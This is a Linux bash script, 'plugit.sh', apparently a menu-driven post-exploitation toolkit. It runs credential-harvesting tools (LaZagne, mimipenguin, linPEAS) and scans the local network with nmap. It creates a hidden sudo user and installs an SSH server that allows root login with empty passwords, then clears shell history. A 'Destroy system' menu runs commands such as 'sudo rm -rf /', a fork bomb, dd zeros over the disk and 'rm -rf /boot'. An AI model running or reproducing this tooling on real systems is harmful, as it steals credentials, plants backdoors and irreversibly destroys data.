#!/bin/bash
#coding:utf-8
#title:plugit.sh
#author:hacknonym
#launch:./plugit.sh <Nb_Terminal>   |or|   bash plugit.sh <Nb_Terminal>  |or|   . plugit.sh <Nb_Terminal>

#terminal text color code
cyan='\e[0;36m'
purple='\e[0;7;35m'
purpleb='\e[0;7;35;1m'
orange='\e[38;5;166m'
orangeb='\e[38;5;166;1m'
orangeh='\e[47;38;5;166;7m'
white='\e[0;37;1m'
whiteu='\e[0;37;1;4m'
whiteh='\e[0;37;1;7m'
grey='\e[0;37m'
greyi='\e[0;37;3m'
green='\e[0;32m'
greenb='\e[0;32;1m'
greenh='\e[0;42;1m'
red='\e[0;31m'
redb='\e[0;31;1m'
redh='\e[0;41;1m'
redhf='\e[0;41;5;1m'
yellow='\e[0;33m'
yellowb='\e[0;33;1m'
yellowh='\e[0;43;1m'
blue='\e[0;34m'
blueb='\e[0;34;1m'
blueh='\e[0;44;1m'

CURRENT_PATH=$(pwd)
PROG_NAME="plugit.sh"

function enumerate_system(){
  TOTAL=5

  echo -e "$greenb[+]$grey Remove old output files..."
  rm -f $CURRENT_PATH/output/enumerate_system/wifipass/*
  rm -f $CURRENT_PATH/output/enumerate_system/lazagne/*
  rm -f $CURRENT_PATH/output/enumerate_system/linPEAS/*
  rm -f $CURRENT_PATH/output/enumerate_system/LinEnum/*
  rm -f $CURRENT_PATH/output/enumerate_system/mimipenguin/*

  echo -en "$greenb[+]$grey Launch wifipass.sh...\t[1/$TOTAL]"
  ./$CURRENT_PATH/wifipass/wifipass.sh > $CURRENT_PATH/output/enumerate_system/wifipass/credentials.txt 2>&1

  echo -en "\r$greenb[+]$grey Launch laZagne.py...\t[2/$TOTAL]"
  python $CURRENT_PATH/LaZagne/Linux/laZagne.py all > $CURRENT_PATH/output/enumerate_system/lazagne/credentials.txt 2>&1

  echo -en "\r$greenb[+]$grey Launch linpeas.sh...\t[3/$TOTAL]"
  ./$CURRENT_PATH/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh > $CURRENT_PATH/output/enumerate_system/linPEAS/credentials.txt 2>&1

  echo -en "\r$greenb[+]$grey Launch LinEnum.sh...\t[4/$TOTAL]"
  ./$CURRENT_PATH/LinEnum/LinEnum.sh > $CURRENT_PATH/output/enumerate_system/LinEnum/credentials.txt 2>&1

  echo -e "\r$greenb[+]$grey Launch mimipenguin.sh..\t[5/$TOTAL]"
  ./$CURRENT_PATH/mimipenguin/mimipenguin.sh > $CURRENT_PATH/output/enumerate_system/mimipenguin/credentials.txt 2>&1
}

function destroy_system(){
	echo -e "$blueb[*]$grey > Destroy system"
  	echo -e """
$white 0$grey) :: Back menu
$white 1$grey) :: $redb(RP)$grey Remove '/' of the system
$white 2$grey) :: ForkBomb command
$white 3$grey) :: $redb(RP)$grey Flushing the hard drive
$white 4$grey) :: $redb(RP)$grey Fill hard drive with zeros
$white 5$grey) :: $redb(RP)$grey Creating a black hole in hard drive
$white 6$grey) :: $redb(RP)$grey Remove boot partition
$white 7$grey) :: Saturate memory $cyan(crunch)$grey
$white 8$grey) :: Saturate memory $cyan(yes command)$grey
"""
	read -p "> " -n 1 -e option

	case $option in

		0 ) back_menu;;
		1 ) 
			echo -e "$greenb[+]$grey Remove '/' of the system..."
			echo -e "$blueb[*]$grey Launch in background"
			sudo rm -rf / &
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		2 ) 
			echo -e "$greenb[+]$grey Launch ForkBomb in progress..."
			:(){ :|: & };:
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		3 ) 
			echo -e "$greenb[+]$grey Flushing the hard drive using 'whoami' command..."
			echo -e "$blueb[*]$grey Launch in background"
			sudo whoami > /dev/sda &
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		4 ) 
			echo -e "$greenb[+]$grey Fill hard drive with zeros..."
			echo -e "$blueb[*]$grey Launch in background"
			sudo dd if=/dev/zero of=/dev/hda &
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		5 ) 
			echo -e "$greenb[+]$grey Creating a black hole in hard drive..."
			echo -e "$blueb[*]$grey Launch in background"
			sudo mv / /dev/null &
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		6 ) 
			echo -e "$greenb[+]$grey Remove boot partition..."
			sudo rm -rf /boot
			destroy_system;;

		7 ) 
			echo -e "$greenb[+]$grey Create a file of 8_521_653 TB inside $HOME/.file.lst..."
			echo -e "$blueb[*]$grey Launch in background"
			if which crunch 1> /dev/null ; then
				crunch 1 128 abcdefghijklmnopqrstuvwxyz > $HOME/.file.lst &
			else
				cd $CURRENT_PATH/crunch/	
				./crunch 1 128 abcdefghijklmnopqrstuvwxyz > $HOME/.file.lst &
				cd $CURRENT_PATH
			fi
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		8 ) 
			echo -e "$blueb[*]$grey Verify the existence of the 'yes' command"
			if which yes 1> /dev/null ; then
				echo -e "$greenb[+]$grey 'yes' command exist"
				echo -e "$greenb[+]$grey Create a file inside $HOME/.file.lst..."
				echo -e "$blueb[*]$grey Launch in background"
				yes > $HOME/.file.lst &
			else
				echo -e "$redb[x]$grey 'yes' command do not exist"
			fi
			echo -ne "$white Push ENTER to back$grey"
			read enter
			destroy_system;;
		* )
		    echo -ne "$redb[x]$grey Error :: "
		    echo -ne "$white Push ENTER to back$grey"
			read enter
		    destroy_system;;
	esac
}

function network_scan(){
	echo -e "$greenb[+]$grey Remove old output files..."
	rm -f $CURRENT_PATH/output/network_scan/*
	
	local_ip=$(hostname -I)
	net_id=$(echo -e "$local_ip" | cut -d '.' -f 1,2,3)
	network_ip=$(echo -e "$net_id.0/24")
	echo -e "$greenb[+]$grey nmap scan in progress..."
	if which nmap 1> /dev/null ; then
		nmap -A $network_ip --open > $CURRENT_PATH/output/network_scan/nmap_scan.txt 2>&1
	else
		cd $CURRENT_PATH/nmap/
		./nmap -A $network_ip --open > $CURRENT_PATH/output/network_scan/nmap_scan.txt 2>&1
		cd $CURRENT_PATH
	fi
}

function search_files(){
	echo -e "$greenb[+]$grey Remove old output files..."
  	rm -f $CURRENT_PATH/output/search_files/*
  	cd $CURRENT_PATH/searchfile/ && ./searchfile.sh
	cd $CURRENT_PATH
}

function create_user(){
	default_username="anonymous"
	echo -ne "[?] Specify the name of the user default($yellowb$default_username$grey)"
	read -p "> " username
	username="${username:-${default_username}}"
	echo -e "$blueb[*]$grey Create '$username' user..."
	sudo useradd $username
	echo -e "$blueb[*]$grey Add administrator privileges..."
	sudo usermod -a -G sudo $username
	echo -e "$blueb[*]$grey Specify a password for '$username'"
	sudo passwd $username
}

function change_passwd(){
	current_user=$(whoami)
	echo -e "$blueb[*]$grey Change the password of '$current_user' user"
	passwd $current_user
}

function install_sshserver(){
	echo -e "$blueb[*]$grey Verify Internet connection..."
	if ping -c 1 -W 1 8.8.4.4 1> /dev/null ; then
		echo -e "$greenb[+]$grey Internet connection is OK"
		echo -e "$greenb[+]$grey Installation in progress..."
		sudo apt-get install -y openssh-server 1> /dev/null
		echo -e "$greenb[+]$grey Configuration..."
		sudo echo """
Port 22
MaxAuthTries 10
MaxSessions 10
LoginGraceTime 10m
PermitEmptyPasswords yes
PermitRootLogin yes""" > /etc/ssh/sshd_config
		echo -e "$greenb[+]$grey Launch ssh service at startup"
		sudo systemctl enable ssh
	else
		echo -e "$redb[x]$grey No Internet connection"
	fi
}

function clear_cmos(){
	echo -e "$greenb[+]$grey Reset BIOS in progress..."
	cd $CURRENT_PATH/cmospwd/src/ && sudo ./cmospwd /k
	cd $CURRENT_PATH
}

function clear_logs(){
	sudo ln -s ~/.bash_history > /dev/null
	history -c
}

function banner(){
	echo -e """$yellowb     ____  __            _ __ 
    / __ \/ /_  ______ _(_) /_
   / /_/ / / / / / __ \`/ / __/
  / ____/ / /_/ / /_/ / / /_  
 /_/   /_/\__,_/\__, /_/\__/  
               /____/$grey        Author: hacknonym
                                    
 $redb(RP) Need Root Privilege$grey"""
}

function back_menu(){
	echo -ne "$white Push ENTER to back menu$grey"
	read enter
	clear && ./$CURRENT_PATH/$PROG_NAME 1
}

#Start the program
if [ $1 -ne 0 -a $1 -le 10 ] ; then
	nb=$(($1 - 1))
	if which gnome-terminal 1> /dev/null ; then
		for i in $(seq 1 $nb) ; do
			gnome-terminal -t "$PROG_NAME" --geometry="84x23" -e "bash $CURRENT_PATH/$PROG_NAME 1"
		done
	elif which xterm 1> /dev/null ; then
		for i in $(seq 1 $nb) ; do
			xterm -fa monaco -fs 12 -T "$PROG_NAME" -geometry "84x23" -bg black -fg white -e "bash $CURRENT_PATH/$PROG_NAME 1" &
		done
	fi
else
	./$CURRENT_PATH/$PROG_NAME 1
fi

resize -s 23 84 1> /dev/null

rm $CURRENT_PATH/output/search_files
ln -s $CURRENT_PATH/searchfile/output/ $CURRENT_PATH/output/search_files

clear && banner
echo -e """
$white 1$grey) :: Enumerating system      (->$yellow output/enumerate_system/ $grey)
$white 2$grey) :: Search important files  (->$yellow output/search_files/ $grey)
$white 3$grey) :: Scan the network $cyan(nmap)$grey (->$yellow output/network_scan/ $grey)
$white 4$grey) :: $redb(RP)$grey Create an admin user
$white 5$grey) :: Change the password of the current user
$white 6$grey) :: $redb(RP)$grey Create an SSH server
$white 7$grey) :: Destroy system
$white 8$grey) :: Clear logs
$white 9$grey) :: $redb(RP)$grey Reset BIOS $cyan(cmospwd)$grey
"""
echo -ne "$greyi/PA$grey"
read -p "> " -n 1 -e option

case $option in

	1 ) enumerate_system; back_menu;;
	2 ) search_files; back_menu;;
	3 ) network_scan; back_menu;;
	4 ) create_user; back_menu;;
	5 ) change_passwd; back_menu;;
	6 ) install_sshserver; back_menu;;
	7 ) destroy_system; back_menu;;
	8 ) clear_logs; back_menu;;
	9 ) clear_cmos; back_menu;;

	* )
	echo -ne "$redb[x]$grey Error :: "
	back_menu;;
esac
